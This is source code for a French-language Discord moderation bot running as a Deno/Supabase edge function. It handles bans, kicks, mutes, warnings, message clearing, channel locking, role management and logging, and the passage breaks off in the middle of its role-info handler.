import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import nacl from "https://esm.sh/tweetnacl@1.0.3";
import Stripe from "https://esm.sh/stripe@18.5.0";

// Discord interaction types
const INTERACTION_TYPE = {
  PING: 1,
  APPLICATION_COMMAND: 2,
  MESSAGE_COMPONENT: 3,
};

const INTERACTION_RESPONSE_TYPE = {
  PONG: 1,
  CHANNEL_MESSAGE_WITH_SOURCE: 4,
  DEFERRED_CHANNEL_MESSAGE_WITH_SOURCE: 5,
  DEFERRED_UPDATE_MESSAGE: 6,
  UPDATE_MESSAGE: 7,
};

const DISCORD_API = 'https://discord.com/api/v10';

// Créateurs - Users with full bot permissions across all servers
const CREATEURS = [
  '1419409950538727465',
  '1285257317260066998',
  '197722858514808832'
];

function isCreateur(userId: string): boolean {
  return CREATEURS.includes(userId);
}

function hexToUint8Array(hex: string): Uint8Array {
  const matches = hex.match(/.{1,2}/g);
  if (!matches) return new Uint8Array();
  return new Uint8Array(matches.map(byte => parseInt(byte, 16)));
}

async function verifyDiscordRequest(request: Request, publicKey: string): Promise<{ isValid: boolean; body: string }> {
  const signature = request.headers.get('X-Signature-Ed25519');
  const timestamp = request.headers.get('X-Signature-Timestamp');
  const body = await request.text();

  if (!signature || !timestamp) return { isValid: false, body };

  const isValid = nacl.sign.detached.verify(
    new TextEncoder().encode(timestamp + body),
    hexToUint8Array(signature),
    hexToUint8Array(publicKey)
  );

  return { isValid, body };
}

// Helper functions
function getOption(options: Array<{ name: string; value: unknown }> | undefined, name: string) {
  return options?.find(o => o.name === name)?.value;
}

async function discordFetch(endpoint: string, options: RequestInit = {}) {
  const token = Deno.env.get('DISCORD_BOT_TOKEN');
  return fetch(`${DISCORD_API}${endpoint}`, {
    ...options,
    headers: {
      'Authorization': `Bot ${token}`,
      'Content-Type': 'application/json',
      ...options.headers
    }
  });
}

function parseDuration(duration: string): number | null {
  const match = duration.match(/^(\d+)(m|h|d|j)$/i);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();
  switch (unit) {
    case 'm': return value * 60 * 1000;
    case 'h': return value * 60 * 60 * 1000;
    case 'd':
    case 'j': return value * 24 * 60 * 60 * 1000;
    default: return null;
  }
}

function formatDuration(ms: number): string {
  const minutes = Math.floor(ms / (60 * 1000));
  const hours = Math.floor(ms / (60 * 60 * 1000));
  const days = Math.floor(ms / (24 * 60 * 60 * 1000));
  if (days > 0) return `${days} jour(s)`;
  if (hours > 0) return `${hours} heure(s)`;
  return `${minutes} minute(s)`;
}

function ephemeral(content: string, embeds?: unknown[]) {
  return new Response(JSON.stringify({
    type: INTERACTION_RESPONSE_TYPE.CHANNEL_MESSAGE_WITH_SOURCE,
    data: { content, embeds, flags: 64 }
  }), { headers: { 'Content-Type': 'application/json' } });
}

function publicMsg(content: string, embeds?: unknown[]) {
  return new Response(JSON.stringify({
    type: INTERACTION_RESPONSE_TYPE.CHANNEL_MESSAGE_WITH_SOURCE,
    data: { content, embeds }
  }), { headers: { 'Content-Type': 'application/json' } });
}

function modEmbed(options: {
  action: string;
  targetId: string;
  targetName: string;
  modId: string;
  reason?: string;
  duration?: string;
  success: boolean;
  color?: number;
  extra?: Array<{ name: string; value: string; inline?: boolean }>;
}) {
  const { action, targetId, targetName, modId, reason, duration, success, color, extra } = options;
  return {
    title: `${success ? '✅' : '❌'} ${action}`,
    color: color || (success ? 0x22C55E : 0xEF4444),
    fields: [
      { name: '👤 Utilisateur', value: `<@${targetId}> (${targetName})`, inline: true },
      { name: '👮 Modérateur', value: `<@${modId}>`, inline: true },
      ...(reason ? [{ name: '📝 Raison', value: reason, inline: false }] : []),
      ...(duration ? [{ name: '⏱️ Durée', value: duration, inline: true }] : []),
      ...(extra || [])
    ],
    timestamp: new Date().toISOString()
  };
}

// ========== LOG HELPER ==========
// Send a log message to the appropriate log channel
async function sendLog(guildId: string, supabase: any, logType: 'mod' | 'raid' | 'msg' | 'role' | 'voice' | 'boost', embed: any) {
  try {
    const columnMap = {
      mod: 'mod_logs_channel_id',
      raid: 'raid_logs_channel_id',
      msg: 'msg_logs_channel_id',
      role: 'role_logs_channel_id',
      voice: 'voice_logs_channel_id',
      boost: 'boost_logs_channel_id',
    };

    const { data: config, error } = await supabase
      .from('guild_config')
      .select(columnMap[logType])
      .eq('guild_id', guildId)
      .single();

    if (error) {
      console.error(`[LOG] Failed to fetch config for guild ${guildId}:`, error.message);
      return;
    }

    const channelId = config?.[columnMap[logType]];
    if (!channelId) {
      console.log(`[LOG] No ${logType} log channel configured for guild ${guildId}`);
      return;
    }

    console.log(`[LOG] Sending ${logType} log to channel ${channelId}`);
    const res = await discordFetch(`/channels/${channelId}/messages`, {
      method: 'POST',
      body: JSON.stringify({ embeds: [embed] })
    });
    
    if (!res.ok) {
      const errText = await res.text();
      console.error(`[LOG] Failed to send ${logType} log (${res.status}):`, errText);
    }
  } catch (e) {
    console.error('[LOG] Failed to send log:', e);
  }
}

// Create a simple log embed
function logEmbed(options: { title: string; description: string; color?: number; fields?: any[] }) {
  return {
    title: options.title,
    description: options.description,
    color: options.color || 0x2B2D31,
    fields: options.fields || [],
    timestamp: new Date().toISOString(),
  };
}

async function handleBan(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const targetId = getOption(interaction.data.options, 'membre') as string;
  const reason = getOption(interaction.data.options, 'raison') as string || 'Aucune raison';

  // Get target user info
  const userRes = await discordFetch(`/users/${targetId}`);
  const targetUser = await userRes.json();

  // Ban the user
  const banRes = await discordFetch(`/guilds/${guildId}/bans/${targetId}`, {
    method: 'PUT',
    body: JSON.stringify({ reason })
  });

  if (!banRes.ok) {
    return ephemeral(`❌ Impossible de bannir cet utilisateur.`);
  }

  // Log to database
  await supabase.from('sanctions').insert({
    guild_id: guildId,
    user_id: targetId,
    moderator_id: modId,
    type: 'ban',
    reason,
    active: true
  });

  // Send log
  await sendLog(guildId, supabase, 'mod', logEmbed({
    title: '🔨 Bannissement',
    description: `<@${modId}> a banni <@${targetId}> (${targetUser.username || targetId})`,
    color: 0xEF4444,
    fields: [{ name: '📝 Raison', value: reason, inline: false }]
  }));

  return publicMsg('', [modEmbed({
    action: 'Bannissement',
    targetId,
    targetName: targetUser.username || targetId,
    modId,
    reason,
    success: true
  })]);
}

async function handleUnban(interaction: any) {
  const guildId = interaction.guild_id;
  const userId = getOption(interaction.data.options, 'user_id') as string;

  const res = await discordFetch(`/guilds/${guildId}/bans/${userId}`, { method: 'DELETE' });
  
  if (!res.ok) {
    return ephemeral(`❌ Impossible de débannir cet utilisateur. Vérifiez l'ID.`);
  }

  return publicMsg(`✅ L'utilisateur <@${userId}> a été débanni.`);
}

async function handleKick(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const targetId = getOption(interaction.data.options, 'membre') as string;
  const reason = getOption(interaction.data.options, 'raison') as string || 'Aucune raison';

  const userRes = await discordFetch(`/users/${targetId}`);
  const targetUser = await userRes.json();

  const kickRes = await discordFetch(`/guilds/${guildId}/members/${targetId}`, {
    method: 'DELETE',
    headers: { 'X-Audit-Log-Reason': reason }
  });

  if (!kickRes.ok) {
    return ephemeral(`❌ Impossible d'expulser cet utilisateur.`);
  }

  await supabase.from('sanctions').insert({
    guild_id: guildId,
    user_id: targetId,
    moderator_id: modId,
    type: 'kick',
    reason,
    active: false
  });

  // Send log
  await sendLog(guildId, supabase, 'mod', logEmbed({
    title: '👢 Expulsion',
    description: `<@${modId}> a expulsé <@${targetId}> (${targetUser.username || targetId})`,
    color: 0xF97316,
    fields: [{ name: '📝 Raison', value: reason, inline: false }]
  }));

  return publicMsg('', [modEmbed({
    action: 'Expulsion',
    targetId,
    targetName: targetUser.username || targetId,
    modId,
    reason,
    success: true
  })]);
}

async function handleMute(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const targetId = getOption(interaction.data.options, 'membre') as string;
  const durationStr = getOption(interaction.data.options, 'duree') as string;
  const reason = getOption(interaction.data.options, 'raison') as string || 'Aucune raison';

  const durationMs = parseDuration(durationStr);
  if (!durationMs || durationMs > 28 * 24 * 60 * 60 * 1000) {
    return ephemeral(`❌ Durée invalide. Format: 10m, 1h, 1d (max 28 jours)`);
  }

  const userRes = await discordFetch(`/users/${targetId}`);
  const targetUser = await userRes.json();

  const timeoutUntil = new Date(Date.now() + durationMs).toISOString();
  const muteRes = await discordFetch(`/guilds/${guildId}/members/${targetId}`, {
    method: 'PATCH',
    body: JSON.stringify({ communication_disabled_until: timeoutUntil })
  });

  if (!muteRes.ok) {
    return ephemeral(`❌ Impossible de mute cet utilisateur.`);
  }

  await supabase.from('sanctions').insert({
    guild_id: guildId,
    user_id: targetId,
    moderator_id: modId,
    type: 'mute',
    reason,
    duration: durationStr,
    expires_at: timeoutUntil,
    active: true
  });

  // Send log
  await sendLog(guildId, supabase, 'mod', logEmbed({
    title: '🔇 Mute',
    description: `<@${modId}> a mute <@${targetId}> (${targetUser.username || targetId}) pour ${formatDuration(durationMs)}`,
    color: 0xF59E0B,
    fields: [{ name: '📝 Raison', value: reason, inline: false }]
  }));

  return publicMsg('', [modEmbed({
    action: 'Mute (Timeout)',
    targetId,
    targetName: targetUser.username || targetId,
    modId,
    reason,
    duration: formatDuration(durationMs),
    success: true
  })]);
}

async function handleUnmute(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const targetId = getOption(interaction.data.options, 'membre') as string;

  const res = await discordFetch(`/guilds/${guildId}/members/${targetId}`, {
    method: 'PATCH',
    body: JSON.stringify({ communication_disabled_until: null })
  });

  if (!res.ok) {
    return ephemeral(`❌ Impossible de unmute cet utilisateur.`);
  }

  // Send log
  await sendLog(guildId, supabase, 'mod', logEmbed({
    title: '🔊 Unmute',
    description: `<@${modId}> a unmute <@${targetId}>`,
    color: 0x22C55E,
  }));

  return publicMsg(`✅ <@${targetId}> a été unmute.`);
}

async function handleClear(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const channelId = interaction.channel_id;
  const count = Math.min(Math.max(getOption(interaction.data.options, 'nombre') as number, 1), 100);
  const memberId = getOption(interaction.data.options, 'membre') as string | undefined;

  // Fetch messages
  const msgsRes = await discordFetch(`/channels/${channelId}/messages?limit=100`);
  let messages: any[] = await msgsRes.json();

  // Filter by member if specified
  if (memberId) {
    messages = messages.filter((m: any) => m.author.id === memberId);
  }

  // Take only requested count and filter out old messages (>14 days)
  const twoWeeksAgo = Date.now() - 14 * 24 * 60 * 60 * 1000;
  const toDelete = messages
    .filter((m: any) => new Date(m.timestamp).getTime() > twoWeeksAgo)
    .slice(0, count);

  if (toDelete.length === 0) {
    return ephemeral(`❌ Aucun message à supprimer.`);
  }

  if (toDelete.length === 1) {
    await discordFetch(`/channels/${channelId}/messages/${toDelete[0].id}`, { method: 'DELETE' });
  } else {
    await discordFetch(`/channels/${channelId}/messages/bulk-delete`, {
      method: 'POST',
      body: JSON.stringify({ messages: toDelete.map((m: any) => m.id) })
    });
  }

  // Send log
  await sendLog(guildId, supabase, 'mod', logEmbed({
    title: '🗑️ Clear',
    description: `<@${modId}> a clear dans le salon <#${channelId}> : ${toDelete.length} messages`,
    color: 0x3B82F6,
  }));

  return ephemeral(`✅ ${toDelete.length} message(s) supprimé(s).`);
}

async function handleLock(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const channelId = getOption(interaction.data.options, 'salon') as string || interaction.channel_id;

  const everyoneRoleId = guildId;

  const res = await discordFetch(`/channels/${channelId}/permissions/${everyoneRoleId}`, {
    method: 'PUT',
    body: JSON.stringify({ type: 0, deny: '2048' })
  });

  if (!res.ok) {
    return ephemeral(`❌ Impossible de verrouiller le salon.`);
  }

  // Send log
  await sendLog(guildId, supabase, 'mod', logEmbed({
    title: '🔒 Verrouillage',
    description: `<@${modId}> a verrouillé le salon <#${channelId}>`,
    color: 0xEF4444,
  }));

  return publicMsg(`🔒 Le salon <#${channelId}> a été verrouillé.`);
}

async function handleUnlock(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const channelId = getOption(interaction.data.options, 'salon') as string || interaction.channel_id;
  const everyoneRoleId = guildId;

  const res = await discordFetch(`/channels/${channelId}/permissions/${everyoneRoleId}`, {
    method: 'PUT',
    body: JSON.stringify({ type: 0, deny: '0' })
  });

  if (!res.ok) {
    return ephemeral(`❌ Impossible de déverrouiller le salon.`);
  }

  // Send log
  await sendLog(guildId, supabase, 'mod', logEmbed({
    title: '🔓 Déverrouillage',
    description: `<@${modId}> a déverrouillé le salon <#${channelId}>`,
    color: 0x22C55E,
  }));

  return publicMsg(`🔓 Le salon <#${channelId}> a été déverrouillé.`);
}

async function handleAddRole(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const memberId = getOption(interaction.data.options, 'membre') as string;
  const roleId = getOption(interaction.data.options, 'role') as string;

  const res = await discordFetch(`/guilds/${guildId}/members/${memberId}/roles/${roleId}`, {
    method: 'PUT'
  });

  if (!res.ok) {
    return ephemeral(`❌ Impossible d'ajouter le rôle.`);
  }

  // Get member info for log
  const memberRes = await discordFetch(`/guilds/${guildId}/members/${memberId}`);
  const member = await memberRes.json();
  const memberName = member.user?.username || memberId;

  // Send log
  await sendLog(guildId, supabase, 'role', logEmbed({
    title: memberName,
    description: `<@${modId}> a ajouté le rôle <@&${roleId}> à ${memberName}`,
    color: 0x22C55E,
  }));

  return publicMsg(`✅ Le rôle <@&${roleId}> a été ajouté à <@${memberId}>.`);
}

async function handleDelRole(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const memberId = getOption(interaction.data.options, 'membre') as string;
  const roleId = getOption(interaction.data.options, 'role') as string;

  const res = await discordFetch(`/guilds/${guildId}/members/${memberId}/roles/${roleId}`, {
    method: 'DELETE'
  });

  if (!res.ok) {
    return ephemeral(`❌ Impossible de retirer le rôle.`);
  }

  // Get member info for log
  const memberRes = await discordFetch(`/guilds/${guildId}/members/${memberId}`);
  const member = await memberRes.json();
  const memberName = member.user?.username || memberId;

  // Send log
  await sendLog(guildId, supabase, 'role', logEmbed({
    title: memberName,
    description: `<@${modId}> a retiré le rôle <@&${roleId}> à ${memberName}`,
    color: 0xEF4444,
  }));

  return publicMsg(`✅ Le rôle <@&${roleId}> a été retiré de <@${memberId}>.`);
}

async function handleSanctions(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const targetId = getOption(interaction.data.options, 'membre') as string;

  const { data: sanctions } = await supabase
    .from('sanctions')
    .select('*')
    .eq('guild_id', guildId)
    .eq('user_id', targetId)
    .order('created_at', { ascending: false })
    .limit(10);

  if (!sanctions || sanctions.length === 0) {
    return ephemeral(`📋 Aucune sanction trouvée pour <@${targetId}>.`);
  }

  const sanctionList = sanctions.map((s: any, i: number) => {
    const date = new Date(s.created_at).toLocaleDateString('fr-FR');
    const emoji = s.type === 'ban' ? '🔨' : s.type === 'kick' ? '👢' : s.type === 'mute' ? '🔇' : '⚠️';
    return `**${i + 1}.** ${emoji} ${s.type.toUpperCase()} - ${date}\n   └ ${s.reason || 'Aucune raison'}${s.duration ? ` (${s.duration})` : ''}`;
  }).join('\n\n');

  return ephemeral('', [{
    title: `📋 Sanctions de l'utilisateur`,
    description: sanctionList,
    color: 0x2B2D31,
    footer: { text: `Total: ${sanctions.length} sanction(s)` }
  }]);
}

async function handleBanlist(interaction: any) {
  const guildId = interaction.guild_id;

  const res = await discordFetch(`/guilds/${guildId}/bans?limit=20`);
  const bans = await res.json();

  if (!bans || bans.length === 0) {
    return ephemeral(`📋 Aucun utilisateur banni.`);
  }

  const banList = bans.map((b: any, i: number) => 
    `**${i + 1}.** ${b.user.username} (\`${b.user.id}\`)\n   └ ${b.reason || 'Aucune raison'}`
  ).join('\n\n');

  return ephemeral('', [{
    title: `🔨 Liste des bannissements`,
    description: banList.slice(0, 4000),
    color: 0xEF4444,
    footer: { text: `${bans.length} utilisateur(s) banni(s)` }
  }]);
}

async function handleMutelist(interaction: any) {
  const guildId = interaction.guild_id;

  const res = await discordFetch(`/guilds/${guildId}/members?limit=1000`);
  const members = await res.json();

  const muted = members.filter((m: any) => m.communication_disabled_until);

  if (muted.length === 0) {
    return ephemeral(`📋 Aucun utilisateur en timeout.`);
  }

  const muteList = muted.map((m: any, i: number) => {
    const until = new Date(m.communication_disabled_until).toLocaleString('fr-FR');
    return `**${i + 1}.** ${m.user.username} (\`${m.user.id}\`)\n   └ Expire: ${until}`;
  }).join('\n\n');

  return ephemeral('', [{
    title: `🔇 Liste des utilisateurs en timeout`,
    description: muteList.slice(0, 4000),
    color: 0xF59E0B,
    footer: { text: `${muted.length} utilisateur(s) en timeout` }
  }]);
}

async function handleWarn(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const targetId = getOption(interaction.data.options, 'membre') as string;
  const reason = getOption(interaction.data.options, 'raison') as string;

  const userRes = await discordFetch(`/users/${targetId}`);
  const targetUser = await userRes.json();

  await supabase.from('sanctions').insert({
    guild_id: guildId,
    user_id: targetId,
    moderator_id: modId,
    type: 'warn',
    reason,
    active: true
  });

  // Count total warns
  const { count } = await supabase
    .from('sanctions')
    .select('*', { count: 'exact', head: true })
    .eq('guild_id', guildId)
    .eq('user_id', targetId)
    .eq('type', 'warn');

  // Send log
  await sendLog(guildId, supabase, 'mod', logEmbed({
    title: '⚠️ Avertissement',
    description: `<@${modId}> a averti <@${targetId}> (${targetUser.username || targetId})`,
    color: 0xF59E0B,
    fields: [
      { name: '📝 Raison', value: reason || 'Aucune raison', inline: false },
      { name: '📊 Total', value: `${count || 1} avertissement(s)`, inline: true }
    ]
  }));

  return publicMsg('', [modEmbed({
    action: 'Avertissement',
    targetId,
    targetName: targetUser.username || targetId,
    modId,
    reason,
    success: true,
    color: 0xF59E0B,
    extra: [{ name: '📊 Total avertissements', value: `${count || 1}`, inline: true }]
  })]);
}

async function handleSanctionsClear(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const targetId = getOption(interaction.data.options, 'membre') as string;

  const { error } = await supabase
    .from('sanctions')
    .delete()
    .eq('guild_id', guildId)
    .eq('user_id', targetId);

  if (error) {
    return ephemeral(`❌ Erreur lors de la suppression des sanctions.`);
  }

  return publicMsg(`✅ Toutes les sanctions de <@${targetId}> ont été supprimées.`);
}

// Help categories data
const HELP_CATEGORIES: Record<string, { emoji: string; label: string; commands: string }> = {
  moderation: {
    emoji: '🛡️',
    label: 'Modération',
    commands: '`/ban <membre> [raison]` — Bannir un membre\n`/unban <user_id>` — Débannir un utilisateur\n`/kick <membre> [raison]` — Expulser un membre\n`/mute <membre> <durée> [raison]` — Mute un membre\n`/unmute <membre>` — Unmute un membre\n`/warn <membre> [raison]` — Avertir un membre\n`/clear <nombre> [membre]` — Supprimer des messages\n`/lock [salon]` — Verrouiller un salon\n`/unlock [salon]` — Déverrouiller un salon\n`/addrole <membre> <role>` — Ajouter un rôle\n`/delrole <membre> <role>` — Retirer un rôle\n`/sanctions <membre>` — Voir les sanctions\n`/sanctions-clear <membre>` — Effacer les sanctions\n`/banlist` — Liste des bannis\n`/mutelist` — Liste des mutes'
  },
  gestion: {
    emoji: '⚙️',
    label: 'Gestion du serveur',
    commands: '`/massiverole <role>` — Donner un rôle à tous\n`/unmassiverole <role>` — Retirer un rôle à tous\n`/renew [salon]` — Cloner et supprimer un salon\n`/embed <json>` — Envoyer un embed personnalisé\n`/bringall` — Déplacer tout le monde dans votre vocal\n`/serverinfo` — Infos du serveur\n`/userinfo [membre]` — Infos d\'un membre\n`/roleinfo <role>` — Infos d\'un rôle\n`/slowmode <durée> [salon]` — Mode lent\n`/temprole <membre> <role> <durée>` — Rôle temporaire\n`/announce <salon> <message>` — Faire une annonce\n`/rolemenu <titre> <roles>` — Menu de rôles'
  },
  tickets: {
    emoji: '🎫',
    label: 'Tickets',
    commands: '`/ticket [sujet]` — Ouvrir un ticket\n`/close` — Fermer un ticket\n`/add <membre>` — Ajouter au ticket\n`/remove <membre>` — Retirer du ticket\n`/rename <nom>` — Renommer le ticket\n`/ticketconfig <catégorie> <rôle>` — Configurer les tickets\n`/ticketpanel [titre]` — Créer un panel de tickets'
  },
  notes: {
    emoji: '📝',
    label: 'Notes & Logs',
    commands: '`/note <membre> <texte>` — Ajouter une note\n`/notes <membre>` — Voir les notes\n`/logs <type> <salon>` — Configurer les logs\n`/setwelcome <message> [salon]` — Message de bienvenue'
  },
  protection: {
    emoji: '🔰',
    label: 'Protection',
    commands: '`/antiraid [on/off]` — Activer/désactiver l\'antiraid\n`/captcha [on/off]` — Activer/désactiver le captcha\n`/antilink [on/off]` — Activer/désactiver l\'antilink\n`/antispam [on/off]` — Activer/désactiver l\'antispam\n`/antilink-ignore <salon>` — Ignorer un salon pour l\'antilink\n`/antilink-sanction <type>` — Sanction antilink\n`/antilink-type <type>` — Type d\'antilink\n`/antispam-config` — Configurer l\'antispam\n`/settings` — Voir la configuration'
  },
  configuration: {
    emoji: '🔧',
    label: 'Configuration',
    commands: '`/counter <type> <salon>` — Compteur de membres\n`/hidereply [on/off]` — Masquer les réponses\n`/showpic [on/off]` — Salon showpic\n`/soutien <role>` — Rôle de soutien\n`/soutien-nolog <role>` — Soutien sans logs\n`/piconly <salon>` — Salon images uniquement'
  },
  owner: {
    emoji: '👑',
    label: 'Propriétaire',
    commands: '`/buyer <membre>` — Ajouter un buyer\n`/unbuyer <membre>` — Retirer un buyer\n`/change <ancien> <nouveau>` — Transférer les données\n`/listoff` — Liste des owners\n`/setowner <membre>` — Ajouter un owner\n`/delowner <membre>` — Retirer un owner'
  },
  utilitaires: {
    emoji: '⚡',
    label: 'Utilitaires',
    commands: '`/say <message>` — Faire parler le bot\n`/stats` — Statistiques du bot\n`/help` — Afficher l\'aide\n`/avatar [membre]` — Avatar d\'un membre\n`/banner [membre]` — Bannière d\'un membre\n`/ping` — Latence du bot\n`/dmall <message>` — DM tous les membres'
  },
  createur: {
    emoji: '🔒',
    label: 'Créateur',
    commands: '`/listallowners` — Tous les owners (global)\n`/listallbuyers` — Tous les buyers (global)\n`/listlicenses` — Toutes les licences\n`/revoke <guild_id>` — Révoquer une licence\n`/createlicense [type] [durée]` — Créer une licence'
  }
};

// Handle help command - sends a dropdown select menu
function handleHelp(interaction: any) {
  const username = interaction.member?.user?.username || 'Utilisateur';
  
  const embed = {
    title: '📖 Protect Bot — Aide',
    description: 'Les paramètres entre `<>` sont obligatoires, ceux entre `[]` sont facultatifs.\n\n**Sélectionnez une catégorie ci-dessous** pour voir les commandes disponibles.',
    color: 0x2B2D31,
    fields: Object.entries(HELP_CATEGORIES).map(([, cat]) => ({
      name: `${cat.emoji} ${cat.label}`,
      value: '\u200B',
      inline: true
    })),
    footer: { text: `Demandé par ${username}` },
    timestamp: new Date().toISOString()
  };

  const components = [{
    type: 1,
    components: [{
      type: 3, // String Select
      custom_id: 'help_category',
      placeholder: '📂 Sélectionnez une catégorie',
      min_values: 1,
      max_values: 1,
      options: Object.entries(HELP_CATEGORIES).map(([key, cat]) => ({
        label: cat.label,
        value: key,
        description: `Voir les commandes ${cat.label.toLowerCase()}`,
        emoji: { name: cat.emoji }
      }))
    }]
  }];

  return new Response(JSON.stringify({
    type: INTERACTION_RESPONSE_TYPE.CHANNEL_MESSAGE_WITH_SOURCE,
    data: { embeds: [embed], components }
  }), { headers: { 'Content-Type': 'application/json' } });
}

// Server Gestion handlers
async function handleMassiverole(interaction: any) {
  const guildId = interaction.guild_id;
  const roleId = getOption(interaction.data.options, 'role') as string;

  // Get all members
  const res = await discordFetch(`/guilds/${guildId}/members?limit=1000`);
  const members = await res.json();

  if (!Array.isArray(members)) {
    return ephemeral(`❌ Impossible de récupérer les membres.`);
  }

  let added = 0;
  for (const member of members) {
    if (!member.roles?.includes(roleId)) {
      const addRes = await discordFetch(`/guilds/${guildId}/members/${member.user.id}/roles/${roleId}`, { method: 'PUT' });
      if (addRes.ok) added++;
    }
  }

  return publicMsg(`✅ Le rôle <@&${roleId}> a été ajouté à **${added}** membre(s).`);
}

async function handleUnmassiverole(interaction: any) {
  const guildId = interaction.guild_id;
  const roleId = getOption(interaction.data.options, 'role') as string;

  const res = await discordFetch(`/guilds/${guildId}/members?limit=1000`);
  const members = await res.json();

  if (!Array.isArray(members)) {
    return ephemeral(`❌ Impossible de récupérer les membres.`);
  }

  let removed = 0;
  for (const member of members) {
    if (member.roles?.includes(roleId)) {
      const delRes = await discordFetch(`/guilds/${guildId}/members/${member.user.id}/roles/${roleId}`, { method: 'DELETE' });
      if (delRes.ok) removed++;
    }
  }

  return publicMsg(`✅ Le rôle <@&${roleId}> a été retiré de **${removed}** membre(s).`);
}

async function handleRenew(interaction: any) {
  const guildId = interaction.guild_id;
  const channelId = getOption(interaction.data.options, 'salon') as string || interaction.channel_id;

  // Get channel info
  const channelRes = await discordFetch(`/channels/${channelId}`);
  const channel = await channelRes.json();

  if (!channel.id) {
    return ephemeral(`❌ Salon introuvable.`);
  }

  // Delete the channel
  const deleteRes = await discordFetch(`/channels/${channelId}`, { method: 'DELETE' });
  if (!deleteRes.ok) {
    return ephemeral(`❌ Impossible de supprimer le salon.`);
  }

  // Recreate it with same properties
  const createRes = await discordFetch(`/guilds/${guildId}/channels`, {
    method: 'POST',
    body: JSON.stringify({
      name: channel.name,
      type: channel.type,
      topic: channel.topic,
      position: channel.position,
      parent_id: channel.parent_id,
      nsfw: channel.nsfw,
      rate_limit_per_user: channel.rate_limit_per_user,
      permission_overwrites: channel.permission_overwrites
    })
  });

  if (!createRes.ok) {
    return ephemeral(`❌ Salon supprimé mais impossible de le recréer.`);
  }

  const newChannel = await createRes.json();
  
  // Send message in the new channel
  await discordFetch(`/channels/${newChannel.id}/messages`, {
    method: 'POST',
    body: JSON.stringify({ content: `🔄 Salon recréé par <@${interaction.member.user.id}>` })
  });

  return ephemeral(`✅ Le salon a été recréé avec succès.`);
}

async function handleEmbed(interaction: any) {
  const title = getOption(interaction.data.options, 'titre') as string;
  const description = getOption(interaction.data.options, 'description') as string;
  const colorStr = getOption(interaction.data.options, 'couleur') as string | undefined;

  let color = 0x2B2D31;
  if (colorStr) {
    const hex = colorStr.replace('#', '');
    color = parseInt(hex, 16) || 0x2B2D31;
  }

  return publicMsg('', [{
    title,
    description,
    color,
    timestamp: new Date().toISOString()
  }]);
}

async function handleServerinfo(interaction: any) {
  const guildId = interaction.guild_id;

  const [guildRes, channelsRes, membersRes] = await Promise.all([
    discordFetch(`/guilds/${guildId}?with_counts=true`),
    discordFetch(`/guilds/${guildId}/channels`),
    discordFetch(`/guilds/${guildId}/members?limit=1`)
  ]);

  const guild = await guildRes.json();
  const channels = await channelsRes.json();

  const textChannels = channels.filter((c: any) => c.type === 0).length;
  const voiceChannels = channels.filter((c: any) => c.type === 2).length;
  const categories = channels.filter((c: any) => c.type === 4).length;

  const createdAt = new Date(Number((BigInt(guildId) >> 22n) + 1420070400000n));

  return publicMsg('', [{
    title: `📊 Informations sur ${guild.name}`,
    color: 0x2B2D31,
    thumbnail: guild.icon ? { url: `https://cdn.discordapp.com/icons/${guildId}/${guild.icon}.png` } : undefined,
    fields: [
      { name: '👑 Propriétaire', value: `<@${guild.owner_id}>`, inline: true },
      { name: '👥 Membres', value: `${guild.approximate_member_count || 'N/A'}`, inline: true },
      { name: '🟢 En ligne', value: `${guild.approximate_presence_count || 'N/A'}`, inline: true },
      { name: '💬 Salons textuels', value: `${textChannels}`, inline: true },
      { name: '🔊 Salons vocaux', value: `${voiceChannels}`, inline: true },
      { name: '📁 Catégories', value: `${categories}`, inline: true },
      { name: '🎭 Rôles', value: `${guild.roles?.length || 0}`, inline: true },
      { name: '😀 Emojis', value: `${guild.emojis?.length || 0}`, inline: true },
      { name: '🚀 Boosts', value: `${guild.premium_subscription_count || 0}`, inline: true },
      { name: '📅 Créé le', value: createdAt.toLocaleDateString('fr-FR'), inline: true },
    ],
    footer: { text: `ID: ${guildId}` }
  }]);
}

async function handleUserinfo(interaction: any) {
  const targetId = getOption(interaction.data.options, 'membre') as string || interaction.member.user.id;
  const guildId = interaction.guild_id;

  const [userRes, memberRes] = await Promise.all([
    discordFetch(`/users/${targetId}`),
    discordFetch(`/guilds/${guildId}/members/${targetId}`)
  ]);

  const user = await userRes.json();
  const member = await memberRes.json();

  const createdAt = new Date(Number((BigInt(targetId) >> 22n) + 1420070400000n));
  const joinedAt = member.joined_at ? new Date(member.joined_at) : null;

  return publicMsg('', [{
    title: `👤 Informations sur ${user.username}`,
    color: 0x2B2D31,
    thumbnail: user.avatar ? { url: `https://cdn.discordapp.com/avatars/${targetId}/${user.avatar}.png` } : undefined,
    fields: [
      { name: '🏷️ Tag', value: user.username, inline: true },
      { name: '🆔 ID', value: `\`${targetId}\``, inline: true },
      { name: '🤖 Bot', value: user.bot ? 'Oui' : 'Non', inline: true },
      { name: '📅 Compte créé', value: createdAt.toLocaleDateString('fr-FR'), inline: true },
      { name: '📥 A rejoint le', value: joinedAt ? joinedAt.toLocaleDateString('fr-FR') : 'N/A', inline: true },
      { name: '🎭 Rôles', value: member.roles?.length > 0 ? member.roles.slice(0, 10).map((r: string) => `<@&${r}>`).join(' ') : 'Aucun', inline: false },
    ],
    footer: { text: `Demandé par ${interaction.member.user.username}` }
  }]);
}

async function handleRoleinfo(interaction: any) {
  const guildId = interaction.guild_id;
  const roleId = getOption(interaction.data.options, 'role') as string;

  const guildRes = await discordFetch(`/guilds/${guildId}`);
  const guild = await guildRes.json();

